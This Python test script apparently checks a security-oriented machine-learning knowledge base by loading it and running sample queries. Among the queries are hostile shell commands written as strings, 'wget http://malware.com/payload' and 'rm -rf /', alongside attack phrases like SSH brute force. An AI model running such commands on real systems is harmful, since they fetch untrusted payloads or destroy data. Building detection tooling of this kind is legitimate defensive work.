#!/usr/bin/env python3
import sys
import pickle
import time
from pathlib import Path

# Add project root to path
sys.path.append(str(Path(__file__).resolve().parent.parent / "src"))
# Also need to ensure the class definition is available for unpickling
sys.path.append(str(Path.cwd() / "src"))

from cyanide.ml.cyanideML.knowledge_base import KnowledgeBase

def verify_kb():
    kb_path = "ai_models/cyanideML/knowledge_base.pkl"
    print(f"[*] Loading Knowledge Base from {kb_path}...")
    start = time.time()
    
    try:
        kb = KnowledgeBase()
        kb.load(kb_path)
        print(f"[*] KB Loaded in {time.time() - start:.2f}s")
    except Exception as e:
        print(f"[!] Failed to load KB: {e}")
        print("[!] Please run 'scripts/train_ml --build-kb' to generate the Knowledge Base.")
        return

    # Test Queries
    queries = [
        "wget http://malware.com/payload",
        "chmod +x script.sh",
        "rm -rf /",
        "ssh brute force attempt",
        "privilege escalation via sudo"
    ]
    
    print("\n--- Testing KB Correlation ---")
    for q in queries:
        print(f"\n[?] Query: '{q}'")
        result = kb.search(q)
        if result:
            # Result is a list of messages. We print the "assistant" response usually.
            # Or just the whole thing briefly.
            # Assuming Alpaca format: user -> assistant
            print(f"[*] Result Found (Type: {type(result)})")
            for m in result:
                role = m.get('role', 'unknown')
                content = m.get('content', '')[:200] + "..."
                print(f"    - {role}: {content}")
        else:
            print("[!] No match found.")

if __name__ == "__main__":
    verify_kb()
